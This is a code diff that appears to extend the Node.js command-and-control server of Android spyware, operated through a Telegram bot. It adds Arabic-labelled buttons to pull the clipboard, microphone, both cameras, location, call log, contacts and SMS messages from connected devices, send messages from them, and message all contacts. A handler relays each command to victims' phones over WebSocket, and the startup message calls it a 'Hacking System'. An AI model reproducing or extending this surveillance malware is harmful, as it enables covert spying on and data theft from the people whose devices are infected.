@@ -36,4 +36,36 @@ wss.on('connection', (ws, req) => {
                 [{ text: "📋 الحافظة (نسخ)", callback_data: `clip_${deviceId}` }, { text: "🎙️ الميكروفون", callback_data: `mic_${deviceId}` }],
                 [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${deviceId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${deviceId}` }],
                 [{ text: "📍 الموقع الحالي", callback_data: `loc_${deviceId}` }, { text: "💬 رسالة منبثقة", callback_data: `toast_${deviceId}` }],
-                [{ text: "📞 سجل المكالم
+                [{ text: "📞 سجل المكالمات", callback_data: `calls_${deviceId}` }, { text: "👥 جهات الاتصال", callback_data: `contacts_${deviceId}` }],
+                [{ text: "📳 اهتزاز الجهاز", callback_data: `vibrate_${deviceId}` }, { text: "🔔 إظهار إشعار", callback_data: `notif_${deviceId}` }],
+                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${deviceId}` }, { text: "📤 إرسال رسالة", callback_data: `sendmsg_${deviceId}` }],
+                [{ text: "🎵 تشغيل مقطع", callback_data: `play_${deviceId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${deviceId}` }],
+                [{ text: "📢 إرسال للكل", callback_data: `msgall_${deviceId}` }]
+            ]
+        }
+    });
+
+    ws.on('message', (data) => {
+        // يتم استقبال ومعالجة البيانات المسحوبة هنا
+    });
+
+    ws.on('close', () => {
+        clients = clients.filter(c => c.id !== deviceId);
+    });
+});
+
+// --- (5) معالجة الأوامر ---
+bot.on("callback_query", (query) => {
+    const [action, devId] = query.data.split("_");
+    const target = clients.find(c => c.id === devId);
+
+    if (!target) return bot.answerCallbackQuery(query.id, { text: "❌ الجهاز غير متصل" });
+
+    target.ws.send(JSON.stringify({ cmd: action }));
+    bot.answerCallbackQuery(query.id, { text: `🚀 جاري تنفيذ: ${action}` });
+});
+
+// --- (6) تشغيل النظام ---
+server.listen(process.env.PORT || 3000, () => {
+    console.log("Hacking System Running with your IDs 🚀");
+});
